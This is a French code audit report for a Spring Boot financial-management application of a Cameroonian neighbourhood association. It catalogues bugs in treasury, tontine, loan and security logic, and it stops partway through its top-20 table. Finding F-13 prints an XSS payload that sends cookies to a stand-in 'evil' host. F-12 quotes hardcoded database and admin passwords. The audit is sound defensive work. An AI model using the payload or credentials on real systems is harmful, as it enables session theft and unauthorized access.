# 🔍 Rapport d'audit complet — ASVOSONK

**Application de gestion financière — Association des Voisins Solidaires de Nkozoa « Nkou-Assi »**

| | |
|---|---|
| **Date de l'audit** | 2026-07-13 |
| **Périmètre** | Intégralité du codebase : 231 fichiers Java, 46 templates Thymeleaf, 11 migrations Flyway, configuration, Docker, module Python |
| **Type** | Audit statique, **lecture seule** (aucun fichier modifié) |
| **Stack** | Spring Boot 3.3 · Java 21 · Spring Data JPA · Spring Security 6 · Thymeleaf · PostgreSQL 16 · Flyway |
| **Nombre de constats** | ~67 consolidés |
| **Note globale** | **3.8 / 10 — non prêt pour la production financière** |

> ⚠️ **Recommandation principale : geler toute mise en production financière** jusqu'à correction des défauts Bloquant/Critique (F-01 à F-17), puis introduire une suite de tests d'intégration (Testcontainers) couvrant les scénarios monétaires.

---

## Table des matières

1. [Compréhension du système](#0-compréhension-du-système)
2. [Incohérences métier et bugs (détaillés)](#1-incohérences-métier-et-bugs)
   - [Défauts Bloquant / Critique](#defauts-bloquant--critique)
   - [Défauts Élevés](#defauts-élevés)
   - [Défauts Moyens](#defauts-moyens)
   - [Défauts Faibles](#defauts-faibles)
3. [Vérifications croisées](#2-vérifications-croisées)
4. [Audit final](#3-audit-final)
   - [Résumé exécutif](#résumé-exécutif)
   - [Top 20 des problèmes critiques](#top-20-des-problèmes-les-plus-critiques)
   - [Carte des zones à risque](#carte-des-zones-à-risque)
   - [Dette technique](#dette-technique)
   - [Santé globale](#santé-globale)

---

## 0. Compréhension du système

**Domaine métier.** ASVOSONK gère les finances d'une association villageoise camerounaise :

- **Membres** + frais d'adhésion (`FeeType`)
- **Séances hebdomadaires** : présence + workflow séquentiel en 6 étapes (`SessionStep`)
- **Fonds de roulement** (`RevolvingFund`) : avances/recouvrements par membre (3 scénarios)
- **Grande tontine** : rotation pair-à-pair avec dettes inter-membres (`TontineDebt`)
- **Tour de présence** : rotation de bénéficiaires
- **Banque** : prêts (10 % / 2 mois) + épargne
- **4 caisses** : développement, sanction, boisson, banque
- **Sanctions** (manuelles + automatiques)
- **Rapports** (exécutable Python externe) et **sauvegardes** (pg_dump)

Monnaie : **FCFA** (sans sous-unité → tout centime est un signal d'erreur).

**Architecture.** Hexagonale / DDD stricte par module (`domain` / `application` / `infrastructure` / `presentation`), double repository (port domaine + Spring Data), mappers manuels, sécurité par permissions granulaires, `ddl-auto=validate` (Flyway propriétaire du schéma), `open-in-view=false`.

**Cœur financier.** `RevolvingFundService` (traitement par membre à la clôture de présence) + `SessionStepService` (orchestration du workflow) + `CashboxService` (seul écrivain autorisé des caisses).

**Constat transversal fondateur.** Le système repose presque entièrement sur des invariants **applicatifs**, sans garantie en base (aucun `CHECK`, aucun verrou, `@Version` absent partout) ni couverture de tests (**1 seul fichier de test** dans tout le projet). La cohérence financière est donc structurellement fragile.

---

## 1. Incohérences métier et bugs

> Échelle de sévérité : **Bloquant** > **Critique** > **Élevée** > **Moyenne** > **Faible**.
> Niveaux de confiance : **Certain** / **Très probable** / **Probable** / **Hypothèse**.

<a name="defauts-bloquant--critique"></a>
### 🟥 Défauts Bloquant / Critique

---

#### F-01 — Le `SessionStatus` ne passe jamais à `closed` : tableau de bord cassé + crash `NonUniqueResultException`

- **Gravité :** Bloquant · **Confiance :** Certain
- **Description :** `SessionStatus` est mis à `open` à la création (`SessionService.create:81`, `CreateSessionUseCase:45`) mais **aucun code** ne le passe à `closed`. Le workflow réel avance via `currentStep` (`CREATED` → … → `REPORT_GENERATED`). La machine à états `planned/open/closed` est morte.
- **Pourquoi c'est problématique :**
  1. `MeetingSessionRepository.findByStatus(SessionStatus.open)` renvoie un `Optional`, mais **toutes** les séances restent `open` → dès la 2ᵉ séance, `getSingleResult` sous-jacent lève `NonUniqueResultException` → **dashboard en erreur 500**.
  2. `findByStatusOrderBySessionDateDesc(closed)` renvoie **toujours** une liste vide → la carte « dernière séance clôturée + rapport » n'apparaît jamais.
- **Emplacement :** `web/presentation/controller/DashboardController.java:56-89` · `session/domain/repository/MeetingSessionRepository.java:18-20` · `session/application/service/SessionService.java:81` · `session/application/usecase/CreateSessionUseCase.java:45`
- **Scénario concret :** 2 séances créées → ouverture du dashboard → `findByStatus(open)` renvoie 2 lignes → exception → page d'accueil inutilisable pour tous les utilisateurs.
- **Impact métier :** Application de facto inutilisable en production dès la 2ᵉ séance ; la page d'atterrissage plante.
- **Correction :** Faire évoluer `SessionStatus` en cohérence avec `currentStep` (passer `closed` à `REPORT_GENERATED`), ou remplacer `findByStatus(open)` par une requête `List` + `findFirst`. Unifier les deux chemins de création dupliqués.

---

#### F-02 — `SessionAttendanceEntity.attendanceStatus` sans `columnDefinition` : risque de crash au démarrage

- **Gravité :** Critique · **Confiance :** Très probable
- **Description :** Toutes les entités enum utilisent `@Enumerated(STRING)` + `@JdbcTypeCode(NAMED_ENUM)` + `columnDefinition="<type_pg>"`. **Seule** `SessionAttendanceEntity` omet `columnDefinition`. Hibernate dérive alors le nom du type PG du nom de classe (`attendancestatus`) ≠ type réel (`attendance_status`).
- **Pourquoi c'est problématique :** Avec `ddl-auto=validate`, tout écart type attendu / type réel fait échouer le démarrage (`SchemaManagementException`).
- **Emplacement :** `session/infrastructure/persistence/entity/SessionAttendanceEntity.java:42-45` · table `session_attendance` (`V1:101`)
- **Scénario concret :** Déploiement propre → au démarrage suivant, Hibernate valide, attend `attendancestatus`, ne le trouve pas → exception → l'application ne démarre pas.
- **Impact métier :** Indisponibilité complète (module Présence, cœur du système, bloqué).
- **Correction :** `@Column(name = "attendance_status", nullable = false, columnDefinition = "attendance_status")`. Ajouter un test `@SpringBootTest` + Testcontainers en CI.

---

#### F-03 — Le fonds de roulement est remis à zéro et abrité d'argent fictif

- **Gravité :** Critique · **Confiance :** Certain
- **Description :** Deux problèmes cumulés :
  1. Le solde par membre est initialisé à **5 000 FCFA** par défaut (`RevolvingFundEntity:26`, `V1:111`), et un fonds est **créé à la volée** avec ce solde si absent (`RevolvingFundService.process:83-88`) → argent créé sans mouvement de financement.
  2. Scénario 3, branche « compromis 1 000 FCFA » : `fund.setBalance(BigDecimal.ZERO)` (`RevolvingFundService:302`) **écrase la totalité** du solde au lieu d'en soustraire un montant, et ne recouvre pas les avances.
- **Pourquoi c'est problématique :** Le fonds est un compte réel ; le remettre à 0 détruit le capital accumulé, l'init à 5 000 fabrique du capital inexistant. Fausse toute la logique d'avance (`hasSufficientBalance`).
- **Emplacement :** `session/application/service/RevolvingFundService.java:83-88, 300-313` · `session/infrastructure/persistence/entity/RevolvingFundEntity.java:26`
- **Scénario concret :** Un membre avec 2 avances paye exactement 1 000 FCFA → le fonds (qui pouvait contenir 40 000) tombe à 0 → les autres membres perdent leur couverture.
- **Impact métier :** Corruption du capital solidaire, décisions de couverture erronées, pertes collectives.
- **Correction :** Supprimer l'auto-init à 5 000 (créer à 0 + mouvement de dotation tracé) ; remplacer `setBalance(ZERO)` par une soustraction bornée (`subtract(...).max(ZERO)`) et recouvrer les avances.

---

#### F-04 — La caisse peut devenir négative (retrait / décaissement sans contrôle de solde)

- **Gravité :** Bloquant · **Confiance :** Certain
- **Description :** `CashboxService.record` fait `balance.subtract(amount)` sans vérifier `>= amount` (l.63-67). `WithdrawMoneyUseCase`, `CashboxController.withdraw` et `CreateLoanUseCase` (décaissement `CashboxType.bank`) n'ajoutent aucun garde-fou. Aucune contrainte `CHECK (balance>=0)` en base.
- **Pourquoi c'est problématique :** On peut décaisser un prêt ou retirer plus que le solde → caisse négative (impossible physiquement), comptes faux, fraude masquable.
- **Emplacement :** `cashbox/application/service/CashboxService.java:63-67` · `cashbox/application/usecase/WithdrawMoneyUseCase.java` · `cashbox/presentation/controller/CashboxController.java:119-143` · `bank/application/usecase/CreateLoanUseCase.java:57-58`
- **Scénario concret :** Caisse Boisson = 3 000 FCFA, sortie saisie de 50 000 → solde −47 000, message « Sortie enregistrée ».
- **Impact métier :** Trésorerie négative, incohérence comptable, dissimulation de vol possible.
- **Correction :** Vérifier le solde avant tout `out` (`BusinessRuleException` sinon) + `CHECK (balance >= 0)` en base.

---

#### F-05 — Paiement de sanction non atomique (statut « payé » vs encaissement en 2 transactions)

- **Gravité :** Critique · **Confiance :** Certain
- **Description :** `SanctionController.pay` committe `paySanctionUseCase.execute(id)` (TX1) **puis** `depositMoneyUseCase.execute(...)` (TX2). Si le crédit échoue (ex. caisse `sanction` absente → `IllegalStateException`), la sanction reste `paid` mais aucun argent n'entre. Le `catch(Exception)` affiche l'erreur sans rollback.
- **Emplacement :** `sanction/presentation/controller/SanctionController.java:119-137` · `PaySanctionUseCase` · `DepositMoneyUseCase`
- **Scénario concret :** Caisse `sanction` absente → sanction marquée « Payé », caisse inchangée, argent « disparu », impossible à re-payer (statut ≠ unpaid).
- **Impact métier :** Trou de caisse, membre libéré d'une dette non perçue.
- **Correction :** Un seul use-case `@Transactional` appelant `CashboxService.credit` en propagation `MANDATORY`.

---

#### F-06 — Sur-crédit de la caisse Sanction à la clôture de présence (création monétaire)

- **Gravité :** Critique · **Confiance :** Très probable
- **Description :** `SessionStepService.closePresence` crédite la caisse `sanction` du **total intégral** des sanctions impayées du bénéficiaire (l.174), alors que la tontine nette est plafonnée à 0 (`netTontine = totalTontine.subtract(deductions).max(0)`, l.193). Si les sanctions dépassent la tontine collectée, on crédite plus que ce qui existait.
- **Emplacement :** `session/application/service/SessionStepService.java:164-193`
- **Scénario concret :** Tontine du bénéficiaire = 1 000, sanctions = 3 000 → caisse +3 000, netTontine = 0 → **2 000 FCFA créés ex nihilo**.
- **Impact métier :** Création monétaire fictive, sanctions soldées sans encaissement réel, comptes faux.
- **Correction :** Plafonner la déduction créditée à `min(totalTontine, deductions)`, ne marquer `paid` que les sanctions réellement couvertes.

---

#### F-07 — Grande tontine : les dettes ne se soldent jamais (sens débiteur/créancier inversé)

- **Gravité :** Critique · **Confiance :** Très probable
- **Description :** À chaque cotisation payée, une dette `debtor=beneficiaryId, creditor=contributorId` est créée (`RecordTontineContributionUseCase:126-131`). La branche de remboursement cherche la dette avec **la même orientation** (`findBy...(tourId, beneficiaryId, contributorId, owed)`, l.79-81). Or pour solder « Y doit à X », il faut que Y cotise plus tard pour X → recherche `debtor=X, creditor=Y` = orientation **inverse** de ce qui est en base. La dette n'est jamais trouvée → une 2ᵉ dette inverse est créée. Les dettes s'accumulent sans jamais passer `repaid`.
- **Emplacement :** `tontine/application/usecase/RecordTontineContributionUseCase.java:79-81, 88-131`
- **Scénario concret :** Séance 1 (bénéf. A), B cotise → dette « A doit à B ». Séance 2 (bénéf. B), A cotise → recherche « B doit à A » (aucune) → crée « B doit à A ». Les deux dettes coexistent, jamais soldées.
- **Impact métier :** Mécanisme central pair-à-pair non fonctionnel ; « qui doit quoi » incalculable ; contentieux entre membres.
- **Correction :** Rechercher la dette où **le cotisant courant est débiteur** (`findBy...(tourId, contributorId, beneficiaryId, owed)`), documenter l'invariant, tester une rotation complète.

---

#### F-08 — Contrôle d'accès contourné : règles de clôture appliquées uniquement côté UI

- **Gravité :** Élevée · **Confiance :** Certain
- **Description :** Plusieurs endpoints POST appliquent des invariants **seulement dans le template** (bouton masqué), contournables par requête forgée :

  | Endpoint | Règle enforced uniquement en UI | Emplacement backend |
  |---|---|---|
  | `POST /presence-tours/{id}/close` | « tous ont bénéficié » | `ClosePresenceTourUseCase` (aucune précondition) |
  | `POST /presence-tours/.../benefited` | ordre de passage, non-doublon | `MarkPresenceBenefitedUseCase:27-44` |
  | `POST /sessions/{id}/tontine/contribute` | bénéficiaire non déjà servi, ordre `drawOrder` | `RecordTontineContributionUseCase` |

- **Pourquoi c'est problématique :** Un utilisateur (même légitime mais mal intentionné, ou lien rejoué) peut clôturer un tour en cours, faire bénéficier quelqu'un deux fois, ou servir hors ordre.
- **Impact métier :** Rupture d'équité de la rotation (proche d'une tontine), pertes financières individuelles, litiges.
- **Correction :** Porter chaque invariant côté use-case (`BusinessRuleException`) ; l'UI ne fait que du confort.

---

#### F-09 — `GetCurrentPresenceBeneficiaryUseCase` : un GET (affichage) clôture le tour comme effet de bord

- **Gravité :** Élevée · **Confiance :** Certain
- **Description :** Use-case nommé « Get », annoté `@Transactional` (lecture-écriture), qui **auto-clôture** le tour quand tous ont bénéficié (l.37). Appelé depuis l'affichage GET de la séance (`SessionController.detail:93`) et `openPresence`. Le `DashboardController` l'évite explicitement (commentaire l.61), preuve que le piège est connu.
- **Emplacement :** `presence/application/usecase/GetCurrentPresenceBeneficiaryUseCase.java:12-13, 37` · `session/presentation/controller/SessionController.java:93`
- **Scénario concret :** Le dernier bénéficiaire vient d'être marqué ; un membre du bureau ouvre la page de la séance (GET) → le tour passe `closed` juste en consultant.
- **Impact métier :** Clôture involontaire non tracée d'un tour de présence lors d'une simple consultation.
- **Correction :** Séparer lecture (`peekNextBeneficiary` en `readOnly=true`) et effet de bord (clôture dans un flux d'écriture explicite).

---

#### F-10 — Étapes financières de séance rejouables (pas d'idempotence, pas de garde de sens)

- **Gravité :** Critique · **Confiance :** Probable
- **Description :** `SessionStepService.transitionToNext` calcule `next = current.next()` et exécute la transition **sans vérifier** que la séance n'est pas clôturée ni qu'une étape n'a pas déjà tourné. `closePresence` crédite les caisses, crée des sanctions, persiste un rapport ; rien n'empêche structurellement une régression d'étape ou un double-appel concurrent (double-clic).
- **Emplacement :** `session/application/service/SessionStepService.java:62-93, 108-217`
- **Scénario concret :** Double-clic sur « Clôturer la présence » → caisses créditées 2×, sanctions dupliquées, rapport écrasé.
- **Impact métier :** Double comptabilisation d'argent.
- **Correction :** Vérifier `!session.isClosed()`, exiger que `current` soit exactement l'étape attendue, verrou pessimiste sur la séance, jeton d'idempotence (pattern PRG).

---

#### F-11 — Suppression de membre = effacement en cascade de tout l'historique financier

- **Gravité :** Critique · **Confiance :** Certain
- **Description :** `DeleteMemberUseCase` fait un **hard delete**. Toutes les FK vers `member(id)` sont `ON DELETE CASCADE` (`membership_fee`, `saving`, `loan`, `sanction`, `tontine_contribution/participant/debt`, `revolving_fund`, `session_attendance`…). Supprimer un membre efface cotisations, prêts, épargne, dettes **envers d'autres membres**, sanctions. Stratégies mélangées : `app_user.member_id` en RESTRICT, `cashbox_movement` en SET NULL.
- **Emplacement :** `member/application/usecase/DeleteMemberUseCase.java:16-20` · `V1__asvosonk_schema.sql` (FKs cascade)
- **Scénario concret :** Suppression d'un membre décédé pour « nettoyer » → toutes ses cotisations, dettes de tontine et prêts disparaissent, faussant les créances des autres membres.
- **Impact métier :** Perte irréversible de la piste d'audit comptable, non-conformité.
- **Correction :** FK financières en `RESTRICT`/`NO ACTION` ; « suppression » = changement de statut (`resigned`/`deceased` existent déjà).

---

#### F-12 — Secrets versionnés + rôle reporting sur-privilégié

- **Gravité :** Critique · **Confiance :** Certain
- **Description :** `application.properties` (versionné, **absent** du `.gitignore`) contient `spring.datasource.password=AsvosonkDb@2024` en clair. Idem `docker-compose.yaml`, `.env`. V1 crée `asvosonk_reports` avec mot de passe trivial en dur (`reports_pwd_change_me`) et `GRANT SELECT ON ALL TABLES` → lecture de `app_user.password_hash`. Admin par défaut `admin/Admin@2024` semé, changement non contraint techniquement.
- **Emplacement :** `application.properties:11-13` · `V1__asvosonk_schema.sql:350-362` · `V2__asvosonk_seed.sql:128-159` · `python-reports/db_config.py:18`
- **Scénario concret :** Fuite du dépôt → connexion directe à PostgreSQL ou réutilisation de `admin/Admin@2024`.
- **Impact métier :** Compromission complète des données + exfiltration des hachages BCrypt.
- **Correction :** Externaliser les secrets (variables d'env) ; purger l'historique Git (BFG/filter-repo) ; roter tous les mots de passe ; restreindre les GRANT du rôle reports (liste blanche, exclure `app_user`) ; forcer le changement du mot de passe admin.

---

#### F-13 — XSS réfléchie + fuite d'information dans `ReportController`

- **Gravité :** Élevée · **Confiance :** Très probable
- **Description :** Sur exception, le contrôleur renvoie du HTML concaténé injectant `e.getMessage()` **non échappé** (l.62-68), lequel contient le `stderr` Python construit à partir du paramètre utilisateur `type`.
- **Emplacement :** `report/presentation/controller/ReportController.java:62-68` · `report/application/service/ReportService.java:86-89` · `python-reports/main.py:42-45`
- **Scénario concret :** `type=<script>document.location='//evil/'+document.cookie</script>` → renvoyé non échappé → exécution dans le navigateur d'un dirigeant (session de 8 h → exploitable longtemps).
- **Impact métier :** Vol de session, actions au nom d'un trésorier/président, divulgation de chemins/infra.
- **Correction :** Valider `type ∈ {session,monthly,quarterly}` en amont ; ne jamais renvoyer `getMessage()` brut ; rendu via Thymeleaf (auto-échappé) ou `HtmlUtils.htmlEscape`.

---

#### F-14 — Autorisation des rapports : tous les types protégés par la seule permission `REPORT_SESSION`

- **Gravité :** Élevée · **Confiance :** Certain
- **Description :** V2 distingue `REPORT_SESSION` / `REPORT_MONTHLY` / `REPORT_QUARTERLY` (le CENSOR n'a pas `REPORT_QUARTERLY`), mais `ReportController.generate` ne vérifie que `REPORT_SESSION` quel que soit le `type`.
- **Emplacement :** `report/presentation/controller/ReportController.java:33-45` · `V2__asvosonk_seed.sql:53-55, 94-115`
- **Scénario concret :** Le CENSOR POST `/reports/generate?type=quarterly` → obtient le rapport trimestriel qu'il n'est pas censé produire.
- **Impact métier :** Production de documents d'audit au-delà des habilitations, contournement de la séparation des rôles.
- **Correction :** Contrôle d'autorisation par type (endpoints distincts ou `switch` sur `type`).

---

#### F-15 — Backups pg_dump inopérants (aucun mot de passe) + échec silencieux

- **Gravité :** Critique · **Confiance :** Très probable
- **Description :** `PgDumpBackupAdapter` lance `pg_dump` sans `PGPASSWORD` ni `.pgpass` → en tâche planifiée (sans TTY), échec `no password supplied`. `BackupScheduler` ne fait que `log.error` — aucune alerte. Aucune sauvegarde n'est jamais produite.
- **Emplacement :** `backup/infrastructure/PgDumpBackupAdapter.java:58-83` · `backup/BackupScheduler.java:27-36`
- **Scénario concret :** Tâche 23h → `pg_dump` échoue → log ERROR non lu → corruption ultérieure du volume Docker → aucune sauvegarde récupérable.
- **Impact métier :** Faux sentiment de sécurité ; perte totale des données financières en cas de sinistre.
- **Correction :** Injecter `PGPASSWORD` (secret) via `pb.environment()`, vérifier fichier non vide, alerter en cas d'échec, métrique « dernière sauvegarde réussie ».

---

#### F-16 — Race condition sur les soldes de caisse (lost update, aucun `@Version`)

- **Gravité :** Critique · **Confiance :** Très probable
- **Description :** Cycle read-modify-write en mémoire (`getBalance().add()/subtract()` puis `setBalance()`) sans verrou, sans `@Version` (absent de tout `src/main`), sans UPDATE atomique. Deux transactions concurrentes (clôture longue + mouvement manuel) écrasent leurs soldes.
- **Emplacement :** `cashbox/application/service/CashboxService.java:57-68` · `cashbox/infrastructure/persistence/entity/CashboxEntity.java`
- **Scénario concret :** Clôture créditant en boucle + entrée manuelle simultanée → un des deux résultats écrase l'autre ; les mouvements existent mais le solde ≠ Σ mouvements.
- **Impact métier :** Écart permanent et silencieux, irréconciliable sans audit manuel.
- **Correction :** `@Version` (optimiste + retries) ou `UPDATE cashbox SET balance = balance + :delta`, ou `LockModeType.PESSIMISTIC_WRITE`. Idem fonds de roulement et TOCTOU du plafond de 2 prêts.

---

#### F-17 — `GlobalMovementViewRepository.searchByKeyword` : `OR` mal parenthésé → filtre ignoré

- **Gravité :** Élevée · **Confiance :** Certain
- **Description :** `WHERE (:memberId IS NULL OR member_id=:memberId) OR module ILIKE :kw OR status ILIKE :kw` : quand `memberId` est `null` (cas courant), la 1ʳᵉ parenthèse vaut `TRUE` → toutes les lignes remontent (200 derniers mouvements, filtre ignoré).
- **Emplacement :** `web/infrastructure/persistence/repository/GlobalMovementViewRepository.java:44-57`
- **Scénario concret :** Recherche « sanction » non parsable en `Long` → `memberId=null` → renvoie tous les mouvements récents au lieu des sanctions.
- **Impact métier :** Recherche globale trompeuse, affichage de mouvements non pertinents.
- **Correction :** `AND (:keyword IS NULL OR module ILIKE :kw OR status ILIKE :kw)`.

---

<a name="defauts-élevés"></a>
### 🟧 Défauts Élevés (supplémentaires)

| ID | Titre | Confiance | Emplacement clé |
|---|---|---|---|
| **F-18** | Prêt sans plafond vs épargne du membre (montant arbitraire, non garanti) | Certain | `CreateLoanUseCase:41-53` |
| **F-19** | Sur-remboursement de prêt accepté ; excédent entre en caisse, masqué par `getRemainingBalance().max(0)` | Certain | `RecordLoanRepaymentUseCase:34-64` · `Loan:75-77` |
| **F-20** | Sur-paiement de frais d'adhésion silencieusement perdu ; aucun mouvement de caisse pour les frais (incohérent avec prêts/épargne) | Certain | `RecordFeePaymentUseCase:44-49` |
| **F-21** | « Total épargnes en caisse » = solde caisse Banque : diverge de la somme réelle des épargnes et **diminue** quand on prête | Certain | `BankController:60-62` · `overview.html:16-18` |
| **F-22** | Défaut de cotisation tontine ne crée aucune dette ; bénéficiaire lésé sans créance tracée | Très probable | `RecordTontineContributionUseCase.handleDefault:139-184` |
| **F-23** | Clôture de tour tontine avec dettes `owed` ouvertes (ne vérifie que `allBenefited`) | Certain | `CloseTourUseCase:27-45` |
| **F-24** | Bénéficiaire tontine marqué « servi » après UNE seule cotisation (pot partiel validé) | Très probable | `SessionController.saveTontineContribution:409` |
| **F-25** | Rôle `asvosonk_reports` peut lire `app_user.password_hash` (GRANT global) | Certain | `V1:355-362` |
| **F-26** | Cascades destructrices généralisées (member + session) | Très probable | `V1` (FKs) |
| **F-27** | Enums orphelins `'default'` (`attendance_status`, `payment_status`) : label DB absent des enums Java ; branche rename V11 morte ; lignes historiques illisibles | Probable | `V5`, `V9`, `V11` · `AttendanceStatus`, `PaymentStatus` |

**Détail F-18 (exemple complet)**
- *Description :* L'éligibilité (`CreateLoanUseCase:41-51`) exige épargne > 0 et < 2 prêts en cours, mais **aucun plafond** du montant emprunté (ni multiple de l'épargne). Seul garde-fou : `@DecimalMin("1")`.
- *Scénario :* Membre avec 1 000 FCFA d'épargne emprunte 5 000 000 FCFA (accepté).
- *Impact :* Prêts non garantis, risque d'insolvabilité, détournement.
- *Correction :* Règle `amount <= totalSavings * PLAFOND` alignée sur le règlement.

**Détail F-27 (exemple complet)**
- *Description :* Le type PG `attendance_status` créé en V1 avec `'default'` ; V5 ajoute `'default_status'`. La branche de rename de V11 (`IF has_default AND NOT has_default_status`) est **toujours fausse** (V5 a déjà ajouté `default_status`) → `'default'` n'est jamais supprimé (PG n'a pas de `DROP VALUE`). Même schéma pour `payment_status` (V9). Résultat : un label DB absent des enums Java.
- *Impact :* Lignes historiques `'default'` → `IllegalArgumentException` au mapping (page 500) ; risque de crash de validation si Hibernate active la validation stricte des labels d'enum.
- *Correction :* Migration de reconstruction du type (CREATE TYPE …_new + `USING CASE`, DROP, RENAME) avec `UPDATE` des lignes résiduelles.

---

<a name="defauts-moyens"></a>
### 🟨 Défauts Moyens

| ID | Titre | Emplacement clé |
|---|---|---|
| **F-28** | Deux tours tontine `open` simultanés (TOCTOU, pas d'index unique partiel `status='open'`) | `CreateTourUseCase:36-59` |
| **F-29** | Double comptage du pot tontine dans « Total collecté » (remboursements re-sommés) | `GetTourSummaryUseCase:54-59` |
| **F-30** | Tontine alimente `totalToTreasurer` sans aucun mouvement de caisse (modèle pair-à-pair incohérent) | `SessionStepService:244-255` |
| **F-31** | `totalToTreasurer` recalculé de 3 façons (closePresence/closeTontine/GenerateReport) ; développement compté en caisse ET « remis au trésorier » | `SessionStepService`, `GenerateSessionReportUseCase:83` |
| **F-32** | `contributorId == beneficiaryId` autorisé (auto-dette `debtor==creditor`) | `RecordTontineContributionUseCase:62-133` |
| **F-33** | Formulaire création tour : `participantIds`/`drawOrders` désynchronisés par index (off-by-one) | `tontine/form.html:38-48` · `CreateTourUseCase:46-69` |
| **F-34** | `drawOrder` réassigné en défaut alors que schéma le dit « immutable » ; violation possible de l'unicité `(tour_id, draw_order)` en concurrence | `RecordTontineContributionUseCase:171-181` |
| **F-35** | « Nouveau solde » affiché après mouvement = **ancien** solde (objet lu avant update) → doubles saisies | `CashboxService:57,83` · `CashboxController:112,140` |
| **F-36** | Solde de caisse jamais rapproché de Σ mouvements (aucun écran de réconciliation) | `GenerateBalanceUseCase`, `CashboxController:69-84` |
| **F-37** | `CloseCashboxUseCase` ne clôture rien (pas d'état open/closed) ; code mort trompeur | `CloseCashboxUseCase:26-31` |
| **F-38** | `record()` renvoie `null` silencieux pour montant ≤ 0 → no-op muet côté appels programmatiques | `CashboxService:55` |
| **F-39** | Annulation de sanction automatique sans réversion du fonds ni motif tracé | `CancelSanctionUseCase:22-38` |
| **F-40** | `ReportService` : `readAllBytes()` bloquant **avant** `waitFor` → interblocage possible (stderr > 64 Ko), timeout inopérant | `ReportService:62-90` |
| **F-41** | Montants transités par `double` dans `mapResults` → perte de précision financière | `GlobalMovementViewRepository:61-68` |
| **F-42** | `global_movement_view` : `amount` non signé (caisses) + `status` fourre-tout → toute `SUM` fausse et double-compte | `V1:297-345` |
| **F-43** | Absence totale de `CHECK` sur colonnes monétaires (négatifs, `amount_paid > amount_due` possibles) | `V1` (toutes colonnes NUMERIC) |
| **F-44** | Dates/heures en `now()` sans fuseau (serveur UTC vs WAT/UTC+1) → décalages d'un jour sur échéances/filtres | `Loan`, `CashboxMovementEntity`, `PaySanctionUseCase` |
| **F-45** | V8 `DROP TABLE session_report CASCADE` + V7 `DROP COLUMN beneficiary_id` : migrations destructrices sans reprise de données | `V8:9-11` · `V7:16` |
| **F-46** | Session 8 h + CSRF désactivé sur `/api/**` (trou latent) + doc port 8080 vs 8085 | `application.properties:40` · `SecurityConfig:91` |
| **F-47** | Éligibilité prêt affichée sans vérifier `member.isActive()` (UI ≠ backend) | `GetMemberBankSummaryUseCase:26-27` |
| **F-48** | Historique caisse chargé intégralement en mémoire puis filtré en Java (pas de pagination) | `CashboxController:60-66` |
| **F-49** | Idempotence : cotisation tontine / remboursement prêt non protégés du double-clic ; violation d'unicité en message SQL brut (`catch(Exception)` exposant `getMessage()`) | `TontineController`, `SessionController:410-412` |

---

<a name="defauts-faibles"></a>
### ⬜ Défauts Faibles

| ID | Titre |
|---|---|
| **F-50** | Double planificateur d'emprunts en retard (02:00 + 08:00), `@Scheduled` sur un use-case (anti-pattern) |
| **F-51** | Intérêt de prêt à échelle 4 non arrondie en FCFA entier (prêt jamais soldé au centime) |
| **F-52** | Mouvements caisse banque sans `member`/`refId` (traçabilité par texte libre uniquement) |
| **F-53** | Constantes prêt (10 %, 2 mois) dupliquées en 4 endroits (domaine, entité, SQL, template) |
| **F-54** | Double badge « Actif » + « En retard » pour un prêt échu non encore marqué |
| **F-55** | Barre de progression de prêt factice (0 % / 100 % selon `isOverdue`, sans remboursement réel) |
| **F-56** | `SavingForm.operationDate` non validée (`@PastOrPresent` absent) → antidatage possible |
| **F-57** | `allBenefited` / `allMatch` = `true` sur liste vide → clôture d'un tour dégénéré |
| **F-58** | `drawOrder` non contraint > 0 côté serveur (valeurs négatives acceptées) |
| **F-59** | Incohérence `NUMERIC(10,2)` (mouvements) vs `(12,2)` (soldes) → overflow à ~100 M FCFA |
| **F-60** | `BaseEntity` inutilisé ; timestamps dupliqués dans ~20 entités (comportement d'audit incohérent) |
| **F-61** | `@UniqueConstraint` obsolète sur `TontineDebtEntity` vs index partiel V10 (piège si `ddl-auto=update`) |
| **F-62** | `tontineSanctionDeductions` jamais calculé (champ mort, `net = brut`) |
| **F-63** | Gestion d'erreur hétérogène (`IllegalArgumentException` vs `ResourceNotFoundException`) |
| **F-64** | Valeur d'enum `AttendanceStatus.recovered` jamais produite (code mort) |
| **F-65** | Migrations enum `ADD VALUE` redondantes (V3+V11 `cancelled`) / portabilité PG < 12 |
| **F-66** | Commentaire backup « localhost:5432 » vs port réel 5433 |
| **F-67** | Module rapports couplé à un `.exe` Windows en dur ; `import psycopg2.extras` fragile |

---

## 2. Vérifications croisées

| Axe | Incohérence détectée |
|---|---|
| **Frontend ↔ Backend** | Règles de clôture (tour présence/tontine), non-doublon bénéficiaire, ordre de tirage, montant tontine (champ caché non validé), éligibilité prêt : enforced **uniquement en UI** (F-08, F-47). |
| **API ↔ Base** | Labels `'default'` en base absents des enums Java (F-27) ; `@UniqueConstraint` entité ≠ index partiel V10 (F-61). |
| **Validation ↔ Persistance** | Formulaires sans bornes (montant, date, plafond) ; toute la validation est applicative, aucun `CHECK` (F-43, F-56, F-18). |
| **Permissions ↔ UI** | Rapports gated `REPORT_SESSION` pour tous les types (F-14) ; boutons masqués ≠ endpoints protégés (F-08). |
| **Documentation ↔ Implémentation** | README port 8080 (réel 8085) ; commentaire backup 5432 (réel 5433) ; `drawOrder` « immutable » mais réassigné ; V11 « fresh DB rename » = branche morte. |
| **Modèles ↔ Services** | `SessionStatus` (planned/open/closed) inutilisé au profit de `currentStep` → dashboard cassé (F-01). |
| **Services ↔ Contrôleurs** | Enchaînements multi-transactions non atomiques (paiement sanction F-05, cotisation + markBenefited). |
| **Tests ↔ Comportement réel** | **1 seul fichier de test** : aucune garantie de non-régression sur la logique financière. |

---

## 3. Audit final

### Résumé exécutif

- **Total : ~67 constats consolidés.**
- **Répartition :** Bloquant **2** · Critique **9** · Élevée **16** · Moyenne **22** · Faible **18**.
- **Risques principaux :**
  1. **Intégrité de la trésorerie** non garantie (caisses négatives, lost update, création monétaire, fonds remis à zéro).
  2. **Disponibilité** (dashboard qui plante dès la 2ᵉ séance, risque de crash au démarrage).
  3. **Sécurité** (secrets versionnés, XSS, backups inexistants, rôle sur-privilégié).
  4. **Mécanique tontine pair-à-pair fondamentalement cassée.**

### Top 20 des problèmes les plus critiques

| Rang | ID | Titre | Gravité |
|---|---|---|---|
| 1 | F-01 | SessionStatus jamais `closed` → dashboard plante | Bloquant |
| 2 | F-04 | Caisse négative sur retrait/décaissement | Bloquant |
| 3 | F-03 | Fonds de roulement remis à zéro + argent fictif | Critique |
